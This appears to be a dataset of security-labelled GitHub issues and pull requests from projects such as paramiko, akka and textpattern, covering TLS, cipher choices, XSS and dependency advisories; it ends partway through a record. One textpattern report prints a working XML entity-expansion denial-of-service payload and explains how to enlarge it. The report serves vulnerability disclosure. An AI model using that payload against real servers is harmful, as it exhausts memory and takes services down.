paramiko/paramiko,133321863,"Removed support for hmac-md5 and truncated hmac-sha1","These are being removed from OpenSSH as well: https://github.com/openssh/openssh-portable/commit/714e367226ded4dc3897078be48b961637350b05
","Failing test appears to be a known one.
[![Coverage Status](https://coveralls.io/builds/5904252/badge)](https://coveralls.io/builds/5904252)

Coverage decreased (-0.03%) to 72.555% when pulling **ec0da667e46024a440c061713dd0cc7031a9edd4 on alex:patch-1** into **a14d266ce13e1909203e59c8b84965070a0aa69f on paramiko:master**.
Dropping this in 3.0 mostly because I've been telling folks 2.0 will remain API/behavior compatible. As noted elsewhere 3.0 will still go out in the nearish future :) thanks!
[![Coverage Status](https://coveralls.io/builds/5929346/badge)](https://coveralls.io/builds/5929346)

Coverage remained the same at 72.41% when pulling **273a1e1eb2f3079edebd22d824210ae6fddd46cb on alex:patch-1** into **86645149c9d066d5fe9222525c8bdf91df7f7de9 on paramiko:master**.
",yes,"Feature,Needs changelog/docs,Security,"
paramiko/paramiko,1935420,"Too difficult to change ciphers, set ssh options in high-level API","The high-level API, while convenient for simple uses, does not scale well into increased complexity.  For example, many ssh options that one might set via ""ssh -o"" are not available.  A common and important ssh tuning parameter is which cipher one wants to use.  Setting to arcfour within a fairly secure context can be an effective way to reduce CPU load.  As far as I've been able to tell, the only way to do this via paramiko's SSHClient class is to subclass and copy and paste the definition of connect, then modify the Transport object before connection.  Eg: copy connect and insert 
    t.get_security_options().ciphers = ('arcfour128',)
at paramiko/client.py:298.

An inexhaustive list of ways this could be handled more maintainably could include:
- initialisation or modification of the Transport is handled by a function that could be independently overridden in a subclass 
- initialisation of modification the Transport is handled by a callback (possibly via a some registration mechanism)
- some sort of configuration dict to be passed around that would allow objects such as Transports to initialise themselves in a generally configurable way
","I just ran into this as well: I'm currently leaning in favor of the third option so you could simple do something like `client.connect(transport_options={…})` to pass in kwargs. I'm using this monstrosity::

``` python
            # See https://github.com/paramiko/paramiko/issues/50 for why we can't do something sane like this:
            # client.get_transport().get_security_options().ciphers = ciphers
            # Release the monkey:
            from paramiko.transport import Transport
            Transport._preferred_ciphers = ciphers + Transport._preferred_ciphers            
```
I think this is definitely something that plagues the library overall - prior development didn't really prioritize being ""Pythonic"" or otherwise easy to use.

I'm redoing my Fabric library which is a layer on top of Paramiko, soon; when I do so I'll be taking a closer look at the APIs in Paramiko and hopefully rearranging things or at least providing additional glue & ability to override in a non awful fashion.

Leaving this open as kind of a pointer to some basic starting points.
",no,"Needs investigation,Feature,Needs patch,Security,ssh_config,"
paramiko/paramiko,231814639,"Drop support for DSA keys","To stay inline with crypto best practices, and OpenSSH, we should plan to eventually drop support for DSA keys: https://www.gentoo.org/support/news-items/2015-08-13-openssh-weak-keys.html",":+1: here.

I think this might dovetail with the still-really-need-time-to-implement-it #387 and/or #50. I.e. a cleaner, user-facing API for configuring supported ciphers and key types (at the _very_ least, honoring the `ssh_config` bits for same, which I don't think we do yet.)

Put another way, I'd love to change the default like OpenSSH 7 did, but only once there is an easy way for users on legacy platforms to change it back.",no,"Keys,Feature,Security,"
paramiko/paramiko,331626452,"RFC8268 added kex dh modp groups support","This is to add support for RFC8268 KEX DH groups 14, 15, 16, 17, 18 with SHA2 hash algorithm.","Wow, edgsousa opened a similar request 10 min ago...",yes,"Ready for review,Feature,Security,"
akka/akka,631544741,"Document generation of akka-pki test resources","Resources used in [`akka-pki` tests](https://github.com/akka/akka/tree/78277d346db5e424d103d06794579f06bc94bdcd/akka-pki/src/test/resources) are a collection of binary files that have no documentation or script to regenerate.

Each resource has a unique format or properties required for the tests it is used in.",,no,"1 - triaged,t:docs,t:security,"
akka/akka,611986218,"Support TLS1.3 in Akka remoting","_Originally posted by @ignasi35 in https://github.com/akka/akka/pull/29004_

[""TLS 1.3 is not directly compatible with previous versions""](https://www.oracle.com/technetwork/java/javase/11-relnote-issues-5012449.html) so we may need to find a way to support rolling upgrades (or not support them at all).

","I've done a local run of the `akka-remote-tests` using JDK 11.0.7 (`openjdk version ""11.0.7"" 2020-04-14`). I've set `TLS1.3 for both the [artery](https://github.com/akka/akka/blob/07e87bc428ff3c9b5099ebda4645f4727833d1b6/akka-remote/src/main/resources/reference.conf#L1134) and netty implementations: all tests completed successfully.

That is an early result, though.TLS has version negotiation so rolling updates to TLS 1.3 should be possible if you enable both TLS 1.2 and 1.3 in an intermediate release and disable older versions of TLS only afterwards. As stated in the document there are still a few potential hurdles:

> 1. TLS 1.3 uses a half-close policy, while TLS 1.2 and prior versions use a duplex-close policy. For applications that depend on the duplex-close policy, there may be compatibility issues when upgrading to TLS 1.3.
> 2. The signature_algorithms_cert extension requires that pre-defined signature algorithms are used for certificate authentication. In practice, however, an application may use unsupported signature algorithms.
> 3. The DSA signature algorithm is not supported in TLS 1.3. If a server is configured to only use DSA certificates, it cannot upgrade to TLS 1.3.
> 4. The supported cipher suites for TLS 1.3 are not the same as TLS 1.2 and prior versions. If an application hard-codes cipher suites which are no longer supported, it may not be able to use TLS 1.3 without modifying the application code.
> 5. The TLS 1.3 session resumption and key update behaviors are different from TLS 1.2 and prior versions. The compatibility impact should be minimal, but it could be a risk if an application depends on the handshake details of the TLS protocols.

In particular, you must make sure that certificates use signature algorithms that are both allowed and supported in both TLS 1.2 and 1.3.> TLS 1.3 uses a half-close policy, while TLS 1.2 and prior versions use a duplex-close policy. For applications that depend on the duplex-close policy, there may be compatibility issues when upgrading to TLS 1.3.

See also #29110slightly off-topic: JDK8 supports [TLS1.3 since u272](https://blog.adoptopenjdk.net/2020/10/adoptopenjdk-8u272-1109-and-1501-available/)

> The OpenJDK project added support for TLS 1.3 to OpenJDK 8. TLS 1.3 is automatically enabled and will be negotiated for connections with servers supporting it. Previously, TLS 1.3 was only available on OpenJDK 11+ or required the installation of additional packages such as OpenJSEE.Great, good to know! Good, that we released 2.5.32 with the TLS v1.3 fix, people which connects against TLS 1.3 servers will have to upgrade.",no,"t:security,"
akka/akka,635179431,"Document generation of akka-stream-tests resources","Resources used in [`akka-stream-tests` tests](https://github.com/akka/akka/tree/master/akka-stream-tests/src/test/resources) are a collection of binary files that have no documentation or script to regenerate.

Each resource has particular content, format or properties required for the tests it is used in.","see also https://github.com/akka/akka/issues/29191 ",no,"1 - triaged,t:stream,t:security,"
akka/akka,788440574,"Invalid incoming TLS handshake should abort, not close the connection","When the `TLS` stage receives an invalid handshake (e.g. a non-TLS connection), the stage is closed rather than failed, causing the connection to be completed normally (FIN) instead of aborted (RST).

It seems https://github.com/akka/akka/pull/18655 added this behavior for some messages, but didn't introduce failing on SSLExceptions during wrapping/unwrapping (perhaps to be conservative in the scope of the change?)",,no,"t:stream,t:io:tls,t:security,"
akka/akka,1246517248,"TLS session is updated too late for TLS 1.3","When acting as a TLS server, in `TLSActor.doUnwrap`, the `currentSession` is updated when `engine.unwrap`'s `result.getHandshakeStatus` is `FINISHED`.

However, at least with TLS 1.3, it is possible for `engine.unwrap` to return `NEED_TASK` after receiving the client authentication, then `NEED_WRAP` after reading the first chunk of application data, and only then `FINISHED`. This leads to the first chunk of application data to be delivered to the user code with the 'old', unauthenticated session.

(this not a security concern: when the client authentication fails this application data will not be consumed at all).

~It would be nice if we could just assume any application data will come in after the client certificate is checked, but I'm not yet confident this is the case.~

This is the root cause of https://github.com/akka/akka-http/issues/4122, see that issue for a reproducer.","TLS 1.3 allows [0-RTT early client data](https://www.rfc-editor.org/rfc/rfc8446#section-2.3) which is not secured against replay attacks (because it is encrypted using a fixed PSK before DHE is finished). Auth data will only be sent in the second client packet (see [Figure 1](https://www.rfc-editor.org/rfc/rfc8446#section-2)).

Could it be that we see a 0-RTT early data packet here?I can rule out a 0-RTT case, it seems to happen if the first data arrives in the same TCP packet as the `Finished` TLS handshake packet.0-RTT doesn't even seem to be implemented in the JVM: https://bugs.openjdk.org/browse/JDK-8049402@jrudolph  @raboof  is this ticket (potentially) fixed? Thanks!> @jrudolph @raboof is this ticket (potentially) fixed? Thanks!

No, we have a tentative fix in the works at #31433 though. If you want to avoid the issue you could either configure your server to only do TLSv1.2, or perhaps build a local snapshot of the Akka artifacts from #31433@raboof thanks for your quick response. Unfortunately, downgrading to  TLSv1.2 is not an option for us, we will wait for the fix to be released.",no,"t:io:tls,t:security,"
akka/akka,610142253,"Update Cluster TLS recommendations in docs","The section on [`Remote Security`](https://doc.akka.io/docs/akka/current/remoting-artery.html#remote-security) of the remoting docs refers to IETF's RFC 7525 which is now being [reviewed](https://datatracker.ietf.org/doc/draft-sheffer-uta-rfc7525bis/history/).

Once the new version is out docs should be upgraded.",,no,"t:security,"
akka/akka,631469927,"Make TLS session verification configurable","Currently we allow hostname verification in `ConfigSSLEngineProvider` and use a SN-based session verification in `RotatingKeysSSLEngineProvider`.

It would be nice to make this configurable, unifying the 2 providers and perhaps allowing additional parameters (such as further restricting the hostnames or SN's).","@raboof @ignasi35 Note that we have `t:security` label. It's rather new so I understand you haven't noticed.",no,"1 - triaged,t:remoting:artery,t:security,"
akka/akka,629336220,"Harden Rotating Keys support","In https://github.com/akka/akka/pull/29152 a new `SSLEngineProvider` with support for rotating keys was introduced. It caches an `SSLContext` for a certain amount of time. When the cache expires and a new request for an `SSLEngine` comes in creating the new `SSLContext` will read from disk again.

That ""read from disk again"" operation has a race with any external tool writing the new key set on disk. As a consequence, the `RotatingKeysSSLEngineProvider` introduced in #29152 may fail with `FileNotFoundException` or it could read a partially written file.

The problem is: what should the `RotatingKeysSSLEngineProvider` code do when such a failure happens? Here are some options:

- the node is considered dead and shuts down
- `RotatingKeysSSLEngineProvider` should produce an `SSLContext` with the old keys (kept in memory just in case) and try again at a later time. Include some logs about the issue.
- retry reading the files immediately
- other...



","Is that from our tests? In a real environment I would expect that the files are swapped atomically.> Is that from our tests? In a real environment I would expect that the files are swapped atomically.

Yes - and that test was removing the whole directory, that would likely not happen in a real-world scenario. Still, recovering from a failure to rotate the keys might be good to improve.

> RotatingKeysSSLEngineProvider should produce an SSLContext with the old keys (kept in memory just in case) and try again at a later time. Include some logs about the issue.

i think indeed replacing the SSLContext only when it has been loaded successfully would be nicest - but let's also see what fits best.

@patriknw I mentioned only race conditions but there could be other failure causes:
 - an invalid update on the `cert-manager` setup causing a cascade DoS (e.g. `cert-manager` produces the wrong private key file format)
 - the issuer CA-chain becomes longer than it is supported by `RotatingKeysSSLEngineProvider`Another potential improvement could be ""pre-rotation validations"": running a set of assertions over the newly created `SSLContext` before swapping. That is, even if the file loading succeeds, and the new `SSLContext` can be built it may not be valid for Artery (e.g. a certificate that's only valid for `serverAuth`).

In that case, the new, invalid `SSLContext` is already in the cache and the node can no longer connect to new nodes (only the existing connections are usable). ",no,"1 - triaged,t:security,"
akka/akka,631550476,"Document formats supported by Artery's X509Readers","Artery's `RotatingKeysSSLEngineProviders` extracts the subject and `SubjectAlternativeName`'s using [`X509Certificate.html#getSubjectAlternativeNames`](https://docs.oracle.com/javase/8/docs/api/java/security/cert/X509Certificate.html#getSubjectAlternativeNames--).

The current implementation only supports `String`-based `DNS` SAN's.",,no,"t:docs,t:remoting:artery,t:security,"
heroku/legacy-cli,40180691,"SHA checksum for tarball should be provided","currently the SHA is only used for the zip version.

In addition this means that the tarball isn't validating the sha internally, it should
","@dickeyxxx Is this still an issue?
",no,"security,"
factor/factor,596185902,"factorcode.org SSL rating needs work","* https://observatory.mozilla.org/analyze/factorcode.org - F
* https://www.ssllabs.com/ssltest/analyze.html?d=factorcode.org - B
* https://check-your-website.server-daten.de/?q=factorcode.org
* https://tls.imirhil.fr/https/factorcode.org
* https://csp-evaluator.withgoogle.com/?csp=https://factorcode.org

Implement:
- [x] Disable TLS 1.0 and 1.1
- [x] CSP https://csp-evaluator.withgoogle.com/?csp=https://factorcode.org
- [x] HSTS - Strict-Transport-Security header
- [x] X-Content-Type-Options
- [x] X-Frame-Options
- [x] X-XSS-Protection
- [ ] Upgrade certbot certificate from rsa-2048 to something better
","I had originally planned to leave all our OpenSSL bindings, but move all our actual socket calls over to libtls, which is significantly more idiot-proof on these kinds of things. I remember you having LibreSSL issues, but I can't remember why or find it on the mailing list. Do you remember what issues there were?And secondarily, I was planning to do some Furnace work today; I can definitely see about adding those extra headers.I think we fixed most everything easy with the LibreSSL checker site. They might have new tests up.

Renewing the certs is finally easy -- ``sudo /usr/local/bin/certbot-auto`` and pick nginx and confirm yes. It's probably easy to automate this part too.

I think the main thing for furnace would be moving to html5 instead of xhtml.",no,"website,http,crypto,web,networking,SSL,factorcode.org,html,security,modernize,"
textpattern/textpattern,371658692,"Potential XSS in jQuery.fn.txpColumnize","Since the function does not appear to be used, I'll post this here instead of the security mailing list (if it still exists), and because the vulnerabilities are obvious.

As with other places in more recent JavaScript, DOM is constructed and updated in rather unsafe manner of making up a literal string of HTML from (potentially) user-given values (such as existing page content), and then just blobbing it into innerhtml.

While you end up with some new shiny nodes, you also end up executing any executable code in the given constructed string. Especially in the case of txpColumnize, as it even unescapes any escaping, if present (it does the whole innerText -> innerHtml juggle pattern).

Instead, one should generate the given elements objects in JS. For instance the following used code:

```
$li.html('<div role=""menuitem""><label><input tabindex=""-1"" class=""checkbox active"" data-name=""list_options"" checked=""checked"" value=""' + $id + '"" data-index=""' + index + '"" type=""checkbox""' + disabled + ' /> ' + $title + '</label></div>');
```

Should be something more like the following:

```javascript
let title = $('<span/>').text($title);
let box = $('<input tabindex=""-1"" class=""checkbox active"" data-name=""list_options"" checked=""checked""/>')
    .attr('value', $id)
    .attr('data-index', index)
    .prop('disabled', disabled);

$li.html($('<div role=""menuitem"" />').html($('<label/>').append(box, title)));
```

Alternatively, one could use templating thingymajig, React-whatitsfaceis or something that takes the mom's spaghetti and makes it more of a representable pasta dish -- buuuutttt I guess you gotta work with what you have.","Thanks Jukka, nice to know you follow! Yep, the recent txp JS is a holly mess, but what user-given values are you talking about in this case? Column names come from core or plugins, and this is a mandatory trusted territory.Lazy ghost is around at times.

Nothing specifically, but that does not count as 'trustworthy' in my eyes. One can not guarantee what it scrapes from the page, meaning it's potentially exposed to whatever values even if it is not supposed to.

When working on DOM, or communicating between two distinct entities, there is no chain of trust, making everything lava. The fact that the column names are supposed to come from trusted source is moot.

(...plus its a publicly exposed API method and can be run on anything, but that is beside the point).Hard to disagree, like on backups. Jokes apart, thanks, I wrongly presumed that jQuery `html()` wouldn't unescape its string argument. Nothing urges atm, but we need to seriously revise `textpattern.js` one day. If you can lend a hand, that would be more than welcome.

**Edit**: for the record, it's actually `text()` that unescapes strings, we must pass it through `textpattern.encodeHTML()`.Yes, the reason why it gets 'unescaped' (not that it truly 'unescapes' anything) is the innerText getter; it gets contents of a node in its plain text presentation. Which is also how the aforementioned textpattern.encodeHTML functions -- in reverse tho.

Not that 'unescaping' is the sole reason what is making it unsafe, just even more so. Even if the used text presentation was replaced with HTML string presentation of the node contents, it is still wrong and exploitable.> Even if the used text presentation was replaced with HTML string presentation of the node contents, it is still wrong and exploitable.

I agree on wrong, curious to see how it is exploitable in txp context.

Okay then, how should we sanitize, say, our general-purpose message pane? Since ages, in async mode we set its innerHTML via plain strings. The sensible parts of these are `txpspecialchars`'ed, but are you saying it's not enough? Or is it different from `textpattern.encodeHTML`'ed strings?Ask yourself: What does `txpspecialchars`, that is a server-side PHP function, have to do with client-side JavaScript?

Just because the current document, or received payload in general, is properly structured does in no case mean you can skip proper sanitisation and value handling in your client-side processing. It has to happen within the context.

For instance, in the case of messages, they must be encoded and handled properly within context of JavaScript, not pre-escaped on the server and used as-is, **if** that is what is happening. Doing that would be very much unsafe and potentially exploitable.To add, with messages pane you probably mean HTML fragment responses (if I recall correctly what Textpattern does). Those are fine.That's how the partials update was in 4.5.7:
```
$response = '$(""'.$p['selector'].'"").replaceWith(""'.escape_js($p['html']).'"")';
...
send_script_response($response);
```
As I get it, all sanitation is done server-side via `escape_js`. Is this fine?I suppose it is. This is not an ideal way of implementing asynchronous interfaces, but it works and it's essentially same as just returning a full document. The main real issue with server-generated JS responses is the fact that the requester/respondent can not validate the response, potentially leaving the interface in a broken state.

Things I would make sure with this particular snippet, is that the `$p['selector']`, which is evaluated by jQuery selector logic, is never nothing more than one of pre-defined list of options, or harshly validated on top of being encoded for a string-use by `escape_js`. If the selector is dynamically generated (etc), it would need to be changed from that query to a filter-logic to avoid errors.Okay, if ""unsafe and potentially exploitable"" means broken interface, there is no emergency, thanks for clarification. I'm only an inspired amateur fearing to break something. Sure, we would do it differently today, but txp has a 15 years history. Any change potentially breaks the few plugins yet working. But I agree, we should progressively move to some twiggy templating. Revising txp JS is on 4.8 todo list.",no,"security,"
textpattern/textpattern,419109112,"New properties for the native css tag","### Is your feature request related to a problem?

No (an improvement).

### What is the feature?

To prevent attacks, possibly into CSS files (see: https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense), maybe it's time to add new properties for the `<txp:css />` tag:
""`integrity`"" attempted to store a SRI hash (Subresource Integrity) and its compagnon ""`crossorigin`"".

Sample of a possible use:

`<txp:css name=""print"" format=""flat.link"" media=""print"" integrity=""sha384-/VLZ9QhATgiUs4ha2DcLiKyQ40fBFB+Wub8YYfGE4GQWPTB1glePJzCoX9Iqzi0q"" crossorigin=""anonymous"" />`

Online tools exist to get that hash (https://www.srihash.org/), maybe a more simple way could be added into core to generate on the fly a such code if user set the property on ""1"":

`<txp:css name=""print"" format=""flat.link"" media=""print"" integrity=""1"" crossorigin=""anonymous"" />`
","Something is [planned](https://github.com/textpattern/textpattern/tree/integrity) in this sense, for JS too. But for flat links this requires some server configuration, since PHP is totally bypassed. Needs investigation.Fine. Cool ;)",no,"tags,security,reminder,"
textpattern/textpattern,294159435,"XML Injection Denial of Service","### Expected behaviour

Validate XML import against a schema

### Actual behaviour

Processes the XML bomb provided

### Steps to reproduce

Import an XML file with the following content:
```xml
<?xml version=""1.0""?>
<!DOCTYPE foo [
<!ELEMENT foo (#PCDATA)>
<!ENTITY l ""lol"" >
<!ENTITY a ""dfszfhsauyfghdusyfgsuyfgsiyfgsdyfgseuyfgesuyfgesiugfseugyfgaeyfaegufeuigyyusadgffyyusdgrdfvgesiyuesjuguishd e sui sgdfuisrg uy f gsfure grg sud yhsd rguysege  sejhges xd u esy sy ugse rfsue g$
<!ENTITY lol ""&l;"">
<!ENTITY lol9 ""&lol;&lol;&lol;&lol;"">
<!ENTITY aa ""&a;&a;&a;&a;"">
<!ENTITY lol10 ""&lol9;&aa;"">
<!ENTITY xxe ""&lol10;"">

]>
<foo>&xxe;</foo>
```

This shows how we can make the server consume memory when parsing the XML. This can be done to eventually exhaust the entire server's memory (depending on configuration) and create a denial of service scenario. 

The lines of code vulnerable are given below:

https://github.com/textpattern/textpattern/blob/1a849492bc2a027c2985202a29832da8008c3c17/textpattern/vendors/Textpattern/Import/TxpXML.php#L101

If schema validation is added to the method, the issue should be resolved. This will also require ensuring entities are not within the XML file too. ","Thanks for the report @ProDigySML. The issue is as critical as any import (e.g. plugins) from untrusted sources, but a validation wouldn't hurt. SimpleXML does not seem to provide a validator, so we'd need to switch to DOMDocument instead.Actually, `libxml2` seems to be protected against XML bombs by default, throwing `Detected an entity reference loop` warning in my tests. Has anyone managed to DoS his server with this?@bloatware yes they have protected against the XML bomb to a certain extent. It is still pretty simple to recreate an XML bomb. All we have to do is ensure that we don't call an entity more than 4 times. Not sure the protection is that simple, mind providing a bomb example?Sure thing @bloatware 
I would've put it up earlier, just didn't really want to make it public. I guess anyone who wants to exploit it can use learn about XML and do it themselves anyway :) 

Example XML code is below:
```xml
<?xml version=""1.0""?>
<!DOCTYPE foo [
<!ELEMENT foo (#PCDATA)>
<!ENTITY l ""lol"" >
<!ENTITY a ""dfszfhsauyfghdusyfgsuyfgsiyfgsdyfgseuyfgesuyfgesiugfseugyfgaeyfaegufeuigyyusadgffyyusdgrdfvgesiyuesjuguishd e sui sgdfuisrg uy f gsfure grg sud yhsd rguysege  sejhges xd u esy sy ugse rfsue gyysd fghsd gfuyes"">
<!ENTITY lol ""&l;"">
<!ENTITY lol9 ""&lol;&lol;&lol;&lol;"">
<!ENTITY aa ""&a;&a;&a;&a;"">
<!ENTITY lol10 ""&lol9;&aa;"">
<!ENTITY xxe ""&lol10;"">

]>
<foo>&xxe;</foo>
```

As you can see, we dont have any restrictions on the length of an entity and the number of entities. We have a restriction on the number of times an entity is called. This can easily be expanded to create a DoS scenario. Then only thing is, you will be sending a large payload yourself, but that still isn't that bad when considering you are putting aside specific resources to DoS the system. 

Hope that helps! :) Thanks @ProDigySML, I know it works in theory, just am not able to create a bomb without sending a really large payload. The server seems to defend itself against exponential attacks, but is probably vulnerable to polynomial ones.

I guess we will just prohibit DOCTYPE declarations atm.I don't think there's much else we can do here. Everyone concur? Or can we do more to mitigate this?Schema validation seems too restrictive, we don't know what kind of documents could be imported in the future. I guess there is nothing we can do if a user imports weird files (XML or whatever) into his txp install.Shall we close this then, and get 4.7.0 beta out?Postpone it to 4.8, perhaps? Custom fields will be a big change, I guess, including XML import.Yep, let’s get beta out ASAP. This can wait.> This attack appear to be exploitable via Uploading a specially crafted XML file.

We also recognize being vulnerable to uploading a specially crafted PHP file to a special directory or installing a specially crafted plugin or whatever harmful action a *site admin* **decides** to undertake. Any ideas how to fix it?Is there any fix for this issue?
Believe that CVE-2018-1000090 was assigned@NicoleG25 the 'issue' is of the same order of criticality that uploading a harmful php file or plugin. We currently use XML import only on setup for data provided with txp distribution, which is safe.@bloatware meaning you disagree with the assignment of the CVE-ID?
I'm not quite sure I follow..
In any case if there is no plan to fix this perhaps you should consider disputing the assignment  ?

Thanks in advance!@NicoleG25 there is (currently) no plan to fix it since there is (currently) nothing to fix. The only persons able to exploit this 'vulnerability' are txp site admins (or hackers capable to upload files to txp system directories). But they have full powers anyway and don't need this hack to destroy the site.

Thank you for your interest.",no,"security,"
klauern/groovyjersey,719293850,"[Security] Bump junit from 3.8.1 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 3.8.1 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.12</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 2</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.12 Beta 1</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.11</h2>
<p>No release notes provided.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>
<blockquote>
<h2>Summary of changes in version 4.13.1</h2>
<h1>Rules</h1>
<h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>
<p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>
<h1>Test Runners</h1>
<h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>
<p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/junit-team/junit4/commits/r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=3.8.1&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=3.8.1&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","We've just been alerted that this update fixes a security vulnerability:

*Sourced from [The GitHub Security Advisory Database](https://github.com/advisories/GHSA-269g-pwp5-87pp).*

> **TemporaryFolder on unix-like systems does not limit access to created files**
> ### Vulnerability
> 
> The JUnit4 test rule [TemporaryFolder](https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html) contains a local information disclosure vulnerability.
> 
> Example of vulnerable code:
> ```java
> public static class HasTempFolder {
>     @Rule
>     public TemporaryFolder folder = new TemporaryFolder();
> 
> ... (truncated)

> 
> Affected versions: [""< 4.13.1""]

",yes,"dependencies,security,"
freenet/fred,124381075,"Throttle unmatched scan","This needs more testing and probably more work. However review would be helpful.
See https://bugs.freenetproject.org/view.php?id=6773
","This is something I'd like to see in 1475
",yes,"security,"
gmacario/gmacario.github.io,915820311,"Potential security vulnerabilities in your dependencies","Please check https://github.com/gmacario/gmacario.github.io/security/dependabot

* browserslist : Upgrade to ~> 4.16.5",,no,"security,"
nbudin/vellum,786777294,"[Security] Bump sanitize from 4.6.4 to 5.2.3","Bumps [sanitize](https://github.com/rgrove/sanitize) from 4.6.4 to 5.2.3. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sanitize/CVE-2020-4054.yml"">The Ruby Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Cross-site scripting vulnerability via <code>&lt;math&gt;</code> or <code>&lt;svg&gt;</code> element in Sanitize</strong>
When HTML is sanitized using Sanitize's &quot;relaxed&quot; config or a custom config that allows certain
elements, some content in a <code>or</code> element may not be sanitized correctly even if
<code>math</code> and <code>svg</code> are not in the allowlist.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom
config that allows one or more of the following HTML elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
<li><code>noframes</code></li>
<li><code>noscript</code></li>
<li><code>plaintext</code></li>
<li><code>script</code></li>
<li><code>style</code></li>
<li><code>svg</code></li>
<li><code>xmp</code></li>
</ul>
<h3>Impact</h3>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
<blockquote>
<p>Patched versions: &gt;= 5.2.1
Unaffected versions: &lt; 3.0.0</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-p4x4-rw2p-8j8m"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Cross-site Scripting in Sanitize</strong>
When HTML is sanitized using Sanitize's &quot;relaxed&quot; config or a custom config that allows certain elements, some content in a <code>or</code> element may not be sanitized correctly even if <code>math</code> and <code>svg</code> are not in the allowlist.</p>
<p>You are likely to be vulnerable to this issue if you use Sanitize's relaxed config or a custom config that allows one or more of the following HTML elements:</p>
<ul>
<li><code>iframe</code></li>
<li><code>math</code></li>
<li><code>noembed</code></li>
